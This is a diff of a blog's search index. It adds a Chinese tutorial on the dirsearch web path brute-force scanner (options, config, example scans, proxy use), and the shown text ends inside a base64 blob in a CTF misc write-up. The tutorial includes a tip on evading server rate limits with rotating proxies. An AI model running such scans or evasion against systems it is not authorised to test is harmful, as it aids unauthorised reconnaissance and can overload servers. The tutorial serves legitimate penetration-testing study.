@@ -1,8 +1,191 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>dirsearch-路径扫描</title>
+    <url>/2022/dirsearch/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一款高级命令行工具，旨在暴力破解网络服务器中的目录和文件，AKA 网络路径扫描器。</p>
+<p>dirsearch进行高精度，可以扩展的扫描，可以根据自己的需求定义，相对于御剑，我个人认为更好点。</p>
+<p><a href="https://github.com/maurosoria/dirsearch">dirsearch工具地址</a></p>
+<span id="more"></span>    
+
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
+<li>使用 git 安装：<code>git clone https://github.com/maurosoria/dirsearch.git</code></li>
+<li>使用 ZIP 文件安装：<a href="https://github.com/maurosoria/dirsearch/archive/master.zip">在此处下载</a></li>
+<li>使用 Docker 安装：（<code>docker build -t &quot;dirsearch:v0.4.1&quot;</code>更多<a href="https://github.com/maurosoria/dirsearch#support-docker">信息</a>）</li>
+<li>使用 Kali Linux 安装：<code>sudo apt-get install dirsearch</code></li>
+<li>使用 PyPi 安装：<code>pip3 install dirsearch</code></li>
+</ul>
+<p>安装库</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/maurosoria/dirsearch.git</span><br><span class="line">cd dirsearch</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSIONS&gt;</span><br></pre></td></tr></table></figure>
+
+<p>requirements.txt 中包含了 dirsearch 中需要的库。</p>
+<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             显示程序的版本号并退出</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">  Mandatory: <span class="comment">#强制性的</span></span><br><span class="line">    -u URL, --url=URL   目标网址</span><br><span class="line">    -l FILE, --url-list=FILE</span><br><span class="line">                        目标URL列表文件</span><br><span class="line">    --stdin             来自STDIN的目标URL列表</span><br><span class="line">    --cidr=CIDR         目标CIDR</span><br><span class="line">    --raw=FILE          从文件加载原始HTTP请求 (use `--scheme` flag to <span class="built_in">set</span> the scheme)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        用逗号分隔的扩展列表 (Example: php,asp)</span><br><span class="line">    -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span><br><span class="line">                        排除由逗号分隔的扩展列表 (Example: asp,jsp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        为每个单词列表条目添加扩展名。默认情况下dirsearch仅将%EXT%关键字替换为扩展</span><br><span class="line"></span><br><span class="line">  Dictionary Settings: <span class="comment">#字典设置</span></span><br><span class="line">    -w WORDLIST, --wordlists=WORDLIST</span><br><span class="line">                        自定义词表 (用逗号分隔)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义前缀 (用逗号分隔)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义后缀，忽略目录(用逗号分隔)</span><br><span class="line">    --only-selected     删除路径与选定路径具有不同的扩展名通过`-e的` (保留条目没有扩展名)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        删除所有路径中的扩展 (Example: admin.php -&gt; admin)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings: <span class="comment">#一般设置</span></span><br><span class="line">    -t THREADS, --threads=THREADS  线程数</span><br><span class="line">    -r, --recursive     暴力循环</span><br><span class="line">    --deep-recursive    对每个目录深度执行递归扫描</span><br><span class="line">                        (Example: api/users -&gt; api/)</span><br><span class="line">    --force-recursive   对每个找到的路径进行递归暴力，而不是只有路径以斜线结尾</span><br><span class="line">    --recursion-depth=DEPTH 最大递归深度</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        执行递归扫描的有效状态代码，支持范围 (用逗号分隔)</span><br><span class="line">    --subdirs=SUBDIRS   扫描给定URL的子目录 (用逗号分隔)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        在递归过程中排除以下子目录扫描 (用逗号分隔)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        包括状态代码，用逗号分隔，支持范围 (Example: 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        排除状态代码，用逗号分隔，支持范围 (Example: 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        按大小排除响应，以逗号分隔 (Example: 123B,4KB)</span><br><span class="line">    --exclude-texts=TEXTS</span><br><span class="line">                        按文本排除回复，用逗号分隔 (Example: <span class="string">&#x27;Not found&#x27;</span>, <span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">    --exclude-regexps=REGEXPS</span><br><span class="line">                        通过regexp排除响应，用逗号分隔</span><br><span class="line">                        (Example: <span class="string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="string">&#x27;^Error$&#x27;</span>)</span><br><span class="line">    --exclude-redirects=REGEXPS</span><br><span class="line">                        通过重定向正则表达式或文本排除响应,</span><br><span class="line">                        用逗号分隔 (Example: <span class="string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="line">    --exclude-content=PATH</span><br><span class="line">                        按此路径的响应内容排除响应</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        无论何时命中其中一个状态码，跳过目标，用逗号分隔，支持范围</span><br><span class="line">    --minimal=LENGTH    最小响应长度</span><br><span class="line">    --maximal=LENGTH    最大响应长度</span><br><span class="line">    --max-time=SECONDS  扫描的最大运行时间</span><br><span class="line">    -q, --quiet-mode    安静模式</span><br><span class="line">    --full-url          输出中的完整URL (在中自动启用安静模式)</span><br><span class="line">    --no-color          没有彩色输出</span><br><span class="line"></span><br><span class="line">  Request Settings: <span class="comment">#请求设置</span></span><br><span class="line">    -m METHOD, --http-method=METHOD HTTP方法 (default: GET)</span><br><span class="line">    -d DATA, --data=DATA HTTP请求数据</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP请求头，支持多个标志 (Example:</span><br><span class="line">                        -H <span class="string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="line">    --header-list=FILE  文件包含HTTP请求头</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        遵循HTTP重定向</span><br><span class="line">    --random-agent      为每个请求选择一个随机用户代理</span><br><span class="line">    --auth-type=TYPE    身份验证类型 (basic, digest, bearer, ntlm)</span><br><span class="line">    --auth=CREDENTIAL   认证凭证 (user:password or bearer token)</span><br><span class="line">    --user-agent=USERAGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings: <span class="comment">#连接设置</span></span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   连接超时</span><br><span class="line">    -s DELAY, --delay=DELAY</span><br><span class="line">                        请求之间的延迟</span><br><span class="line">    --proxy=PROXY       代理URL，支持HTTP和SOCKS代理 (Example:</span><br><span class="line">                        localhost:8080, socks5://localhost:8088)</span><br><span class="line">    --proxy-list=FILE   文件包含代理服务器</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        要使用找到的路径重播的代理</span><br><span class="line">    --scheme=SCHEME     默认方案 (对于原始请求或如果没有URL中的方案)</span><br><span class="line">    --max-rate=RATE     每秒最大请求数</span><br><span class="line">    --retries=RETRIES   失败请求的重试次数</span><br><span class="line">    -b, --request-by-hostname</span><br><span class="line">                        默认情况下，通过IP搜索速度请求。这将强制dirsearch按主机名请求</span><br><span class="line">    --ip=IP             服务器IP地址</span><br><span class="line">    --exit-on-error     每当发生错误时退出</span><br><span class="line"></span><br><span class="line">  Reports:</span><br><span class="line">    -o FILE, --output=FILE</span><br><span class="line">                        输出文件</span><br><span class="line">    --format=FORMAT     报告格式 (Available: simple, plain, json, xml,</span><br><span class="line">                        md, csv, html)</span><br></pre></td></tr></table></figure>
+
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>dirsearch 工具可以根据自己的需求进行配置，配置文件为 default.conf 。选择带 <code>#</code> 的进行配置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If you want to edit dirsearch default configurations, you can</span><br><span class="line"># edit values in this file. Everything after `#` is a comment</span><br><span class="line"># and won&#x27;t be applied</span><br><span class="line"></span><br><span class="line">[mandatory]</span><br><span class="line">default-extensions = php,aspx,jsp,html,js</span><br><span class="line">force-extensions = False</span><br><span class="line"># exclude-extensions = old,log</span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line">threads = 30</span><br><span class="line">recursive = False</span><br><span class="line">deep-recursive = False</span><br><span class="line">force-recursive = False</span><br><span class="line">recursion-depth = 0</span><br><span class="line">exclude-subdirs = %%ff/</span><br><span class="line">random-user-agents = False</span><br><span class="line">max-time = 0</span><br><span class="line">full-url = False</span><br><span class="line">quiet-mode = False</span><br><span class="line">color = True</span><br><span class="line">recursion-status = 200-399,401,403</span><br><span class="line"># include-status = 200-299,401</span><br><span class="line"># exclude-status = 400,500-999</span><br><span class="line"># exclude-sizes = 0b,123gb</span><br><span class="line"># exclude-texts = &quot;Not found&quot;</span><br><span class="line"># exclude-regexps = &quot;403 [a-z]&#123;1,25&#125;&quot;</span><br><span class="line"># exclude-content = 404.html</span><br><span class="line"># skip-on-status = 429,999</span><br><span class="line"></span><br><span class="line">[reports]</span><br><span class="line">report-format = plain</span><br><span class="line">autosave-report = True</span><br><span class="line"># report-output-folder = /home/user</span><br><span class="line"># logs-location = /tmp</span><br><span class="line">## Supported: plain, simple, json, xml, md, csv, html</span><br><span class="line"></span><br><span class="line">[dictionary]</span><br><span class="line">lowercase = False</span><br><span class="line">uppercase = False</span><br><span class="line">capitalization = False</span><br><span class="line"># prefixes = .,admin</span><br><span class="line"># suffixes = ~,.bak</span><br><span class="line"># wordlist = db/dicc.txt</span><br><span class="line"></span><br><span class="line">[request]</span><br><span class="line">httpmethod = get</span><br><span class="line">## Lowercase only</span><br><span class="line">follow-redirects = False</span><br><span class="line"># headers-file = headers.txt</span><br><span class="line"># user-agent = MyUserAgent</span><br><span class="line"># cookie = SESSIONID=123</span><br><span class="line"></span><br><span class="line">[connection]</span><br><span class="line">timeout = 5</span><br><span class="line">delay = 0</span><br><span class="line">scheme = http</span><br><span class="line">maxrate = 0</span><br><span class="line">retries = 2</span><br><span class="line">request-by-hostname = False</span><br><span class="line">exit-on-error = False</span><br><span class="line"># proxy = localhost:8080</span><br><span class="line"># proxy-list = proxies.txt</span><br><span class="line"># replay-proxy = localhost:8000</span><br></pre></td></tr></table></figure>
+
+<h1 id="命令-使用"><a href="#命令-使用" class="headerlink" title="命令-使用"></a>命令-使用</h1><h2 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h2><p>对 URL 进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>扫描固定后缀文件的 URL</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>定义字典扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure>
+
+<h2 id="暂停扫描"><a href="#暂停扫描" class="headerlink" title="暂停扫描"></a>暂停扫描</h2><p>dirsearch 允许您使用 CTRL+C 暂停扫描进度，从这里，您可以保存进度（稍后继续）、跳过当前目标或跳过当前子目录。</p>
+<p><img src="/2022/dirsearch/pause.png"></p>
+
+
+<h2 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h2><ul>
+<li>通过使用**-r | –recursive**参数，dirsearch 将递归地暴力破解所有目录。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>您可以使用–recursion-depth</strong>设置最大递归深度，使用–recursion <strong>-</strong> status 设置递归状态码</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r --recursion-depth 3 --recursion-status 200-399</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>还有 2 个选项：</p>
+<p><strong>–force-recursive</strong> 和 <strong>–deep-recursive</strong></p>
+<ul>
+<li><strong>强制递归</strong>：暴力递归所有找到的路径，而不仅仅是路径以<code>/</code></li>
+<li><strong>深度递归</strong>：递归暴力破解路径的所有深度（<code>a/b/c</code>&#x3D;&gt; 添加<code>a/</code>，<code>a/b/</code>）</li>
+</ul>
+</li>
+</ul>
+<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程号 ( <strong>-t | –threads</strong> ) 反映了分离的蛮力进程的数量。所以线程数越大，dirsearch 运行得越快。默认情况下，线程数为 30，但如果您想加快进度，可以增加它。</p>
+<p>速度仍然很大程度上取决于服务器的响应时间。如果你的线程过大可能导致Dos</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20</span><br></pre></td></tr></table></figure>
+
+<h2 id="前缀-x2F-后缀"><a href="#前缀-x2F-后缀" class="headerlink" title="前缀&#x2F;后缀"></a>前缀&#x2F;后缀</h2><p>自定义扫描文件前缀或者后缀</p>
+<ul>
+<li><strong>–prefixes</strong>：为所有条目添加自定义前缀</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --prefixes .,admin,_</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tools</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">.tools</span><br><span class="line">admintools</span><br><span class="line">_tools</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–suffixes</strong>：为所有条目添加自定义后缀</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --suffixes ~</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">internal</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">index.php~</span><br><span class="line">internal~</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>在<code>db/</code>文件夹内，有几个“黑名单文件”。如果这些文件中的路径与文件名中提到的状态相同，则将从扫描结果中过滤掉它们。</p>
+<p>示例：如果您添加<code>admin.php</code>到<code>db/403_blacklist.txt</code>，每当您执行<code>admin.php</code>返回 403 的扫描时，都会从结果中过滤掉。</p>
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>使用**-i | –include-status<strong>和</strong>-x | –exclude-status**选择允许和不允许的响应状态码</p>
+<p>对于更高级的过滤器：</p>
+<ul>
+<li><strong>–exclude-sizes</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KB</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-texts</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-texts &quot;403 Forbidden&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-regexps</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps &quot;^Error$&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-redirects</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects &quot;https://(.*).okta.com/*&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>-exclude-content</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-content /error.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="原始请求"><a href="#原始请求" class="headerlink" title="原始请求"></a>原始请求</h2><p><strong>dirsearch</strong> 允许您从文件中导入原始请求。内容看起来像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: admin.example.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
+
+<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>既然扫描网站，我们也可以选择使用 GET 或者 POST 方法</p>
+<p>但是在 post 方法中，POST 是万维网使用的 HTTP 支持的请求方法。POST 请求方法在设计上要求 Web 服务器接受包含在请求消息正文中的数据，最有可能存储它。它通常与 GET HTTP 方法一起使用，该方法在名称或值对中用于将表单数据附加到 URL。如果您使用 GET，则 URL 长度将受到限制。这使用户能够提交书签的结果。</p>
+<p>现在，我们正在使用此命令在 [-m] 参数的帮助下探索另一面。</p>
+<p>正如我们所知，与我们之前执行的 GET 请求方法相比，这些结果是不同且独特的。它显示了一些不同的网页和网页目录。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -m POST</span><br></pre></td></tr></table></figure>
+
+<h2 id="延迟请求"><a href="#延迟请求" class="headerlink" title="延迟请求"></a>延迟请求</h2><p>根据规则，或者限制，延迟自己的请求，免除造成不必要的网络拥堵</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -s 10</span><br></pre></td></tr></table></figure>
+
+<h2 id="词表格式"><a href="#词表格式" class="headerlink" title="词表格式"></a>词表格式</h2><p>支持的词表格式：大写、小写、大写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小写</span><br><span class="line">admin</span><br><span class="line">index.html</span><br><span class="line">大写</span><br><span class="line">ADMIN</span><br><span class="line">INDEX.HTML</span><br><span class="line">首部</span><br><span class="line">Admin</span><br><span class="line">Index.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="排除扩展"><a href="#排除扩展" class="headerlink" title="排除扩展"></a>排除扩展</h2><ul>
+<li>使用**-X | –exclude-extensions**带有扩展名列表将删除单词列表中包含给定扩展名的所有路径</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target -X jsp</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.php</span><br><span class="line">test.jsp</span><br><span class="line"></span><br><span class="line">扫描后：</span><br><span class="line">admin.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果要排除所有扩展名，除了您在<code>-e</code>标志中选择的扩展名，请使用**–only-selected**</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e html -u https://target --only-selected</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">admin.php</span><br><span class="line">扫描后</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="扫描子目录"><a href="#扫描子目录" class="headerlink" title="扫描子目录"></a>扫描子目录</h2><ul>
+<li><strong>从 URL，您可以使用–subdirs</strong>扫描子目录列表。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --subdirs admin/,folder/,/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>它的反向版本是**–exclude-subdirs**，它可以防止 dirsearch 递归扫描给定的子目录。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --recursive --exclude-subdirs image/,css/</span><br></pre></td></tr></table></figure>
+
+<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>dirsearch 支持 SOCKS 和 HTTP 代理，有两个选项：代理服务器或代理服务器列表。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p>支持的报告格式：<strong>simple</strong>、<strong>plain</strong>、<strong>json</strong>、<strong>xml</strong>、<strong>md</strong>、<strong>csv</strong>、 <strong>html</strong></p>
+<p>将扫描变成报告输出出来</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -l URLs.txt --format plain -o report.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --format html -o target.json</span><br></pre></td></tr></table></figure>
+
+<h2 id="没色扫描"><a href="#没色扫描" class="headerlink" title="没色扫描"></a>没色扫描</h2><p>扫描结果是没有颜色的，看个人喜好，毕竟有人喜欢花里胡哨</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ --no-color</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h2><ul>
+<li>服务器有请求限制？这很糟糕，但随意绕过它，通过随机代理<code>--proxy-list</code></li>
+<li>想要找出配置文件或备份？尝试<code>--suffixes ~</code>并<code>--prefixes .</code></li>
+<li>只想查找文件夹&#x2F;目录？为什么不结合<code>--remove-extensions</code>和<code>--suffixes /</code>！</li>
+<li>使用 CIDR 进行暴力破解时，混合使用<code>--cidr</code>、和 将减少大部分噪音 + 假阴性<code>-F``-q</code></li>
+<li>扫描 URL 列表，但不想看到 429 泛滥？<code>--skip-on-status 429</code>将帮助您在返回 429 时跳过目标</li>
+<li>服务器包含会减慢扫描速度的大文件？您<em>可能</em>想使用<code>HEAD</code>HTTP 方法而不是<code>GET</code></li>
+<li>蛮力 CIDR 很慢？可能您忘记减少请求超时和请求重试。建议:<code>--timeout 3 --retries 1</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Misc小合集（一）</title>
-    <url>/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/</url>
+    <url>/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次杂项小训练</p>
 <p><strong>Misc 1</strong> - <strong>Misc 10</strong></p>
 <span id="more"></span>
@@ -15,11 +198,11 @@
 </ul>
 <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先用string命令查看文件，得到两段可疑代码</p>
 <p>使用下面的一段，看起来像base64码</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220312124955095.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312124955095.png"></p>
 <p>在Word里面，显示隐藏文字和解除隐藏。文字无法复制，但是我发现可以通过剪切出。</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220312125607111.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125607111.png"></p>
 <p>也可以通过解除隐藏复制</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220312125914279.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125914279.png"></p>
 <p>将它们组合起来</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a2draGxmY290bnRpdWZwZ2hodGN3dWprY2ttb3ducGNrbXdseWd0bHBtZmtneWFhaWh1Y2RsYXRveXVjb2lnZ3JwbGt2a2Ftcmt0cXp4ZW1taXdrbGh1YWVrY2VvbHBvY2ZtdGFobWdmbWF2YWpuYmNwbWx0anRwdWZqY2FwY3RvanBqYmZmYmpid2h1YWxnZ3lqbmFtY2JmeWFjamJheGtpeGxtbXFpa3NtcHRxeW9qZXJ0ZmVrdGR4ZHh4YnRyeGNhbmd5bXNpbWh2dXdrdGV4c2dscnRwZ2FrdGJtZnVjZ3ZubXRqdWZvZWt5bXRsaW14ZGlqanB4eWl0YWJwbWt1Y2NubGtwb2V0Z2NkY3Bvc2tpenZ5eHJ0enhyYXh0bm9paHFjeGZvYWFhbHBhanlja2VrYnljZnZqb21sbGthamd5bWdmZGNycGVxa2xmc2NtZWppY3BqaWtjcHBhY3h5ZXZma3ljcHBia2R6Y2ZsbGlrcW5pdGNrYmhqb3JuZGhzb21mdHlwYWhwcW94cnlpbWhmbGNoY21rb3JldG1yb3RrYXJjanRobWZ0aWxpam55a3V0aWhienR0dW1zbmdmdGxtcmJmZmx0ZndjbmptZmF0bGZiemxva3RscHBsbWZpY29rcHBucGFjbWZ1Z21wdW5kdnRvbXdldmNqc2dhamdmZXF1dXBhaWV0eW5mamJicGpzbHZ5bmFmdG1scHBka3R0b2Z1emppanhpdGJmaXJtb3ZwemVraXJic2Zqc2d6bHVrb2x5dm9obXZnY3BrdGhzeGZ6bW1ibm1sZHp5dWljZHZrbXpiYXlidG9yY2ZvdHRkYW1jY25iYXBucmd4bGN5cGh5Zm5jZXhidmRubG9rZ295aWxwcmxvbnNodGNranR4bmFiamhsbWJwZGNtaGtqbmxnbXRnam5qYWtyaXpsbHBtbWFscHhhbXVuaW51cGtwZGlhcHNzbXZrZGp2Z2l5b2R1bXBuYXBsamtqYmNmaHRoc2tpb2twZ3R0eWhubmRzeGtxanp2dmRvc2VwcG9pZ3l0bW5uYXZjdG9wZHlpeHZiZG9zb2JtY3ViaXVhanhoeWZrdnJremdjdXlpbHB2YXdheW5xYWFwbGJrd2lpeHJjdGN0bGt4ZmpscGVhbW1qbmF1amNvdWlmbXZpa2ZpbXJvYXF0Y3RjZm1hdWJnYWdva2FyZnFmaGVtb3NydHlmb3B1a3VkY2FhaW1oZGZvZ25oa3JjZWxwY2F0Y3RweWpsYXZva2xnY2xhdGx0bXR6eWdwZWhma3poY3R6bmdtb2ZjaXpsdm54dG5sdWFqbHRvdmNqYWp1YnphdHBlaGhma25uZ2dwbHlsaXZmZWFpZHJteWp0YWNhbXhjbmtmeXN0d2ZuZmx5bmJta2NrYXJ4YWlzcGpsa3ZjdHZrbHh1bmNmcGJ4dmlyaXFleXBtdXZ1bHZsamNrY3lwcHRwdmV0b3hobWlwYmlsbmplb3drd3VjdG9rbmFmcHdvYXBmdGNsemhwaHhjY2F0dGh1bXZ3aHpvbWFmd3Fxbmxzb3lhYnV0bHpwaWF0Zm1tYWprcmR2bGN6d2pwc3Nwb2FiaWZpcGhrb2NocHRrYXRrYWZlb255YmZpdmVjbGR6b2ZhdGV0Z2FsaGFmYW1vYXlvc291bm5hZmlhdGNqdGl3b29sYWNya2N1YWRwdXRreWxweXBiZ2ZlcHdwc25jd2tjd2xsYXJ5anNjYW5id3BkcHpicHR1dG5sbm9wd3BpdGJsb3RsbHppZmtsYWF1cmpwaWFqZnB0a2ZteHBic3VjdmpzZ21jYWxhbnRyc2NrYmt1eWZnYWFrZmFjbmxkdXZxZXR5amdqbW5hZWFjbmdheGNuYW1qbWlna2tpdW1sbmR3Y2ttdWFuYW52cnJiZnp4enl1dWVob25lbWxjanp1dm9hanVmZGdqampjZ21ucHRmdXVjdWJjdGpoYW1sb2xmaG9pZnZia2themNwb3pjeXVjYnJnb2picG5haGNneXV0dGR2bXR0dndqbWhic2ptYmJhdmNkbHlob3Fqb21wY3B2aHRrb2FpcnZ0bWtmZnlhdGttcHR1dW9vb2xncG5udWVsaGZodnZpc3Vrd3lubWlhY25sbHVtaHRqZWt1YXV1cGxyeGtpZXB1anhsaWNma2NiY2htbmdsZ3BsaWhteWNybnNvbWF3dWZ1b29tdXVuaGRvb2FydWRhbW9hbW9ocW9vY2Z1cGp1aWFieHh1dnl2bm9zb3Vvb3Zha2xjZmt0eXJmYWdmYXl2cHVmdnBiZ3RhZmVraXBpY292dGZ0bnV4c2phdmpkcWt2ZnVpa2x0bWRrYmJua3BhZnhycXBmZ2N0dmFzY3VqamN1Y2h1YXpjaXVtdHRkbmF3aWhtbW9qZmJoeHZvbX